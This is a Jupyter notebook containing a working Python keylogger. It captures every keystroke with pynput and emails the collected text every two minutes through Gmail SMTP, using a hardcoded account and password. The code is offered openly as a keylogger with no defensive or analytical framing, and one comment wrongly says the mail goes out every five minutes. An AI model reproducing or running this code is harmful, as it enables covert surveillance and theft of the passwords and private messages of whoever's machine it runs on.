{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pynput\n",
    "from pynput.keyboard import Key, Listener\n",
    "import threading\n",
    "import smtplib"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "keys=\"Keylogger started\" # Just for the first time\n",
    "\n",
    "def on_press(key):\n",
    "    global keys\n",
    "    try:\n",
    "        keys=keys+str(key.char)\n",
    "    # Need a special case for space, tab, enter keys as there are no chars! We get AttributeError for those\n",
    "    except AttributeError:\n",
    "        if key==key.space:\n",
    "            keys=keys+\" \" # To make things cleaner, insert a space for the space key\n",
    "        else:\n",
    "            keys=keys+\" \"+str(key)+\" \"\n",
    "   \n",
    "            \n",
    "def on_release(key):\n",
    "    if key==Key.esc:\n",
    "        return False # Breaks if escape key pressed\n",
    "    \n",
    "def report():\n",
    "    global keys\n",
    "    if len(keys)>0:\n",
    "        sendmail(\"dummylegacy69@gmail.com\",\"dummylegacy1234\",\"\\n\\n\"+keys) #Shoots a mail every 5 mins if not empty \\n\\n is to avoid text in the subject of the mail. Happens sometimes\n",
    "    keys=\"\"\n",
    "    timer=threading.Timer(120, report) # Calls itself every 2 mins without interrupting the main program\n",
    "    timer.start()\n",
    "\n",
    "def sendmail(email,password,message):\n",
    "    server=smtplib.SMTP(\"smtp.gmail.com\",587)\n",
    "    server.starttls()\n",
    "    server.login(email,password)\n",
    "    server.sendmail(email,email,message)\n",
    "    server.quit()\n",
    "    \n",
    "def main():\n",
    "    with Listener(on_press=on_press, on_release = on_release) as listener:\n",
    "#These functions will be called when a key is pressed and released respectively\n",
    "        report()\n",
    "        listener.join() # Will continuously keep running this loop until we break out of it\n",
    "if __name__ == \"__main__\":\n",
    "    main()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
